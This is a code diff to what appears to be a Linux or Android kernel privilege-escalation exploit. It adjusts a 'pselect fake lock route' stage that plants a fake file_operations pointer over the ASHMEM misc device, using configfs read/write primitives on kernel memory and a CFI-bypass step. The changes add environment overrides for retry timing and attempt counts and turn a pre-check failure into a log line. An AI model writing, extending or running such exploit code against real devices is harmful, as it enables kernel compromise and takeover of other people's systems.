@@ -35,12 +35,35 @@ uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
 
 static int route_delay_usec(int attempt) {
+  const char *forced = getenv("PSELECT_DELAY_USEC");
+  if (forced && *forced) {
+    char *end = NULL;
+    long value = strtol(forced, &end, 0);
+    if (end != forced && *end == 0 && value >= 0 && value <= 1000000) {
+      return (int)value;
+    }
+  }
+
+  // 就两个值交替
   static const int delays[] = {
-    50000, 60000,
+    5000, 6000,
   };
 
   int count = (int)(sizeof(delays) / sizeof(delays[0]));
   return delays[(attempt - 1) % count];
+}
+
+static int route_attempt_limit(void) {
+  const char *forced = getenv("PSELECT_ROUTE_ATTEMPTS");
+  if (forced && *forced) {
+    char *end = NULL;
+    long value = strtol(forced, &end, 0);
+    if (end != forced && *end == 0 && value >= 1 &&
+        value <= PSELECT_CFI_ROUTE_ATTEMPTS) {
+      return (int)value;
+    }
+  }
+  return PSELECT_CFI_ROUTE_ATTEMPTS;
 }
 
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
@@ -97,7 +120,8 @@ void do_pselect_fake_lock_route(void) {
   int calls = 0;
   int success = 0;
   int route_verified = 0;
-  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
+  int attempt_limit = route_attempt_limit();
+  for (int route_attempt = 1; route_attempt <= attempt_limit;
        route_attempt++) {
     if (route_attempt != 1) {
       page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
@@ -168,11 +192,11 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
-    if (route_verified || cfi_dirty_seen || !route_signal) {
+    if (route_verified || cfi_dirty_seen) {
       break;
     }
     pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
-            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
+            route_attempt, attempt_limit, cfi_last_step,
             cfi_last_errno);
   }
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
@@ -296,16 +320,24 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
-  uint64_t pre_fops = 0;
-  ssize_t pre_rb = configfs_read_once(
-      fd, misc_fops, &pre_fops, sizeof(pre_fops));
-  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
-    fops_before = pre_fops;
-    cfi_last_step = 4;
-    cfi_last_errno = errno;
-    goto fail;
-  }
+  uintptr_t misc_fops = misc_fops_data_addr();
+uint64_t pre_fops = 0;
+ssize_t pre_rb = configfs_read_once(
+    fd, misc_fops, &pre_fops, sizeof(pre_fops));
+fops_before = pre_fops;
+
+// 只记日志，不判断成败
+if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
+  pr_info("cfi precheck note fd=%d target=%016llx rb=%zd read=%016llx "
+          "want=%016llx page=%016llx fake_parent=%016llx "
+          "fake_right=%016llx bin_target=%016llx\n",
+          fd, (unsigned long long)misc_fops, pre_rb,
+          (unsigned long long)pre_fops, (unsigned long long)fake_fops,
+          (unsigned long long)page_base,
+          (unsigned long long)fake_parent,
+          (unsigned long long)fake_right,
+          (unsigned long long)binwrite_target);
+}
 
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
@@ -345,6 +377,11 @@ int try_cfi_stage(void) {
   ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
   fops_before = before;
   if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
+    pr_info("cfi postcheck miss fd=%d target=%016llx rb=%zd read=%016llx "
+            "want=%016llx page=%016llx\n",
+            fd, (unsigned long long)misc_fops, rb,
+            (unsigned long long)before, (unsigned long long)fake_fops,
+            (unsigned long long)page_base);
     cfi_last_step = 4;
     cfi_last_errno = errno;
     goto fail;
